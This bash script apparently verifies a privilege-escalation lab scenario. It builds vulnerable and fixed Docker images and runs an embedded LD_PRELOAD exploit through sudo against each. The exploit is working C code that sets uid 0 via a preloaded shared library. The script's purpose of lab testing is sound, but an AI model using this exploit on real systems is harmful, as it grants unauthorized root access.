#!/bin/bash
# Differential verification for expert_ld_preload_sudo
# Returns 0 if scenario is correctly configured, 1 otherwise

set -e
SCENARIO_DIR="$(cd "$(dirname "$0")" && pwd)"
SCENARIO_NAME="$(basename "$SCENARIO_DIR")"
VULN_IMAGE="privesc-$(echo ${SCENARIO_NAME} | tr '[:upper:]' '[:lower:]')-vuln"
FIXED_IMAGE="privesc-$(echo ${SCENARIO_NAME} | tr '[:upper:]' '[:lower:]')-fixed"

echo "=== Verifying scenario: ${SCENARIO_NAME} ==="

echo "[L1] Building vulnerable image..."
docker build -t "$VULN_IMAGE" -f "$SCENARIO_DIR/Dockerfile" "$SCENARIO_DIR" > /dev/null 2>&1
echo "[L1] Building fixed image..."
docker build -t "$FIXED_IMAGE" -f "$SCENARIO_DIR/Dockerfile.fixed" "$SCENARIO_DIR" > /dev/null 2>&1
echo "[L1] PASS: Both images build successfully"

# Layer 2: Exploit differential test
EXPLOIT_SCRIPT='cat > /tmp/pe.c <<"C_EOF"
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
void _init(void){ unsetenv("LD_PRELOAD"); setresuid(0,0,0); system("id > /tmp/pe.out"); }
C_EOF
gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c 2>/dev/null
sudo LD_PRELOAD=/tmp/pe.so /usr/bin/id >/dev/null 2>&1 || true
cat /tmp/pe.out 2>/dev/null'

echo "[L2] Testing exploit on vulnerable image..."
VULN_CONTAINER=$(docker run -d "$VULN_IMAGE")
sleep 2
VULN_OUT=$(docker exec "$VULN_CONTAINER" su - testuser -c "$EXPLOIT_SCRIPT" 2>&1 || true)
docker rm -f "$VULN_CONTAINER" > /dev/null 2>&1

if echo "$VULN_OUT" | grep -q "uid=0"; then
    echo "[L2] PASS: Exploit yields uid=0 on vulnerable image"
else
    echo "[L2] FAIL: Exploit did not yield root on vulnerable image"
    echo "  Output: $VULN_OUT"
    exit 1
fi

echo "[L2] Testing exploit on fixed image..."
FIXED_CONTAINER=$(docker run -d "$FIXED_IMAGE")
sleep 2
FIXED_OUT=$(docker exec "$FIXED_CONTAINER" su - testuser -c "$EXPLOIT_SCRIPT" 2>&1 || true)
docker rm -f "$FIXED_CONTAINER" > /dev/null 2>&1

if echo "$FIXED_OUT" | grep -q "uid=0"; then
    echo "[L2] FAIL: Exploit unexpectedly succeeded on fixed image"
    echo "  Output: $FIXED_OUT"
    exit 1
else
    echo "[L2] PASS: Exploit blocked on fixed image"
fi

docker rmi "$VULN_IMAGE" "$FIXED_IMAGE" > /dev/null 2>&1 || true

echo "=== VERIFIED: ${SCENARIO_NAME} ==="
exit 0
